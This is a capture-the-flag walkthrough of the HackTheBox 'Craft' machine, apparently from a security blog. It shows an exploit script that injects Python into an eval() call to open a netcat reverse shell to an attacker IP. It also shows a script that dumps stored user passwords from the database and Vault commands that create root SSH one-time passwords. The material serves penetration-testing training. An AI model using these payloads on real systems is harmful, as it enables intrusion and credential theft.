---
title: "Craft"
date: 2020-01-03T18:10:15-05:00
draft: false
---

## **Introduction**
Craft is a medium-difficulty vulnerable machine on HackTheBox.eu. It is rated as primarily enumeration, life-like, and involving custom exploitation. 

## **Host Infomation**

IP: 10.10.10.110 available over VPN to VIP-hackthebox.eu

Ports: 22, 443, 6022

## **Attack Path**

There are a number of subdomains available for browsing once you navigate to https://10.10.10.110 and accept the insecure certificates. To navigate to these URIs more fluidly, simply add the following to your /etc/hosts file:

```bash
10.10.10.110    craft.htb api.craft.htb gogs.craft.htb vault.craft.htb
```

Navigating to the API at api.craft.htb and poking around a little reveals that we need valid credentials to generate API keys to make POST/PUT/DELETE requests to the endpoints. Nothing immediately jumps out as insecure so we navigate to the git repo available at gogs.craft.htb. Throwing truffleHog at this might be useful, but with some digging on the list of commits we can see Gilfoyle responding to an insecure commit made by Dinesh (shocker). 

**Bertram Gilfoyle**  
_I fixed the database schema so this is not an issue now.. Can we remove that sorry excuse for a "patch" before something awful happens?_  

The line of code being referenced:  

```python
if eval('%s > 1') % request.json['abv']):
```

_eval_ in python is dangerous as it directly executes any internal python code that is passed to it. We know right away from this that this POST method to the abv value in POST /brew is vulnerable to a python command injection, but since it requires a valid API key to make requests, we need to go digging. Dinesh actually leaked his API key (JWT token) in his issue submission in the repo, but when you decode the JWT it is time-based so it is a red-herring. Continuing to dig we can find Dinesh's credentials listed in one of his old test-files:  

In his "cleanup test" commit we can see that his user credentials are:  

> auth=('dinesh', '4aUh0A8PbVJxgd')

We can now provide these credentials, and just add them to his test script to not have to worry about writing our own code (although that is possible to do if you have the extra time).

We go right for the command injection on POST /brew. It took some digging but this blog post has exactly what we need.

_https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html_

My exploit code is below:
```python
print("Create bogus ABV brew")
brew_dict = {}
brew_dict['id']=29
brew_dict['abv'] = '__import__("os").system("mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 10.10.14.28 4444 1>/tmp/backpipe")'
brew_dict['name'] = 'newbullshit'
brew_dict['brewer'] = 'bullshit'
brew_dict['style'] = 'bullshit'
print(brew_dict)

json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print(response.text)
print(response)
```  

We shouldn't even get a response.text or response print, those were simply for debug purposes, but we should get a reverse shell back to us on port 4444 immediately upon the eval() code executing server-side. A point of note here is our use of backpipes to create an execution layer in netcat, since the installed version does not have "-e" installed, we can just create the backpipe and then leverage it to give us /bin/sh. The relevant article is here:  

_https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/_

Upon connecting, we are _root_! But root in italics because after some enumeration we find we are in a docker container, cool! Looks like the application is running is "quarantined" in a Docker container, but somehow is able to do queries to the database for information, so there might be a way to dumb DB creds via SQL! 

We don't have to go far. Right in the **/opt/app** directoy that we land in upon getting our reverse shell we find a dbtest.py script that allows us to connect to the database and execute SQL commands. I will attach my altered SQL commands here which allow us to dump the entire user table from the database. Key points here are the existence of the user table which can be found in the Gilfoyle code commits in the git repo as well as the usage of "fetchall()" in our python dbattack.py script, the initial script has fetchOne() which only returns the first record. fetchall() from pymysql allows us to fetch all records. Alternatively I think it would be possible to directly query the mysql database from the command line as well if one were so inclined. 

```python
#!/usr/bin/env python

import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try:
    with connection.cursor() as cursor:
        sql = "SELECT `id`, `username`, `password` FROM `user`"
        cursor.execute(sql)
        result = cursor.fetchall()
        print(result)

finally:
    connection.close()
```

Running our scripts dumps all the user credentials (stored in plaintext, yay -_-):  
```bash
[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'},  
{'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'},   
{'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
```
Backing out and logging into Gilfoyles account on the repo reveals his SSH keys (which are encrypted and thanks to his password reuse, are decrypted using the same password as his login!)

```bash
$ ssh -i id_rsa gilfoyle@craft.htb
```

> user.txt achieved!

Executing LinEnum.sh in our /tmp directory allows us to see that there is a Docker instance running. Investigating this a little further we can see that there is a "Vault" application running that with some research, seems to allow us to generate SSH keys (those of a root user to be exact), we can poke around and find the related configuration files in the git repo, so essentially we are already root, we just need to figure out how to generate ourselves an SSH OTP and authenticate to the system as root. Lets give that a shot.

# Gilfoyle repo > craft-infra > vault > secrets.sh

relevant URI to help your research: _https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html_

```bash
#!/bin/bash

# set up vault secrets backend

vault secrets enable ssh

vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=0.0.0.0/0
```

## Final Commands | Root Achieved!

```bash
$ vault write ssh/roles/otp_key_role key_type=otp default_user=root cidr_list=0.0.0.0/0
$ vault write ssh/creds/otp_key_role ip=10.10.10.110
```

Those two commands will generate an SSH OTP key for you to use. Now just auth to SSH with:  
> ssh root@10.10.10.110

And paste the OTP into the password field and _voila_, you are root! Read the flag and root dance. 

```bash
root@craft:~# whoami
root
root@craft:~# id
uid=0(root) gid=0(root) groups=0(root)
```





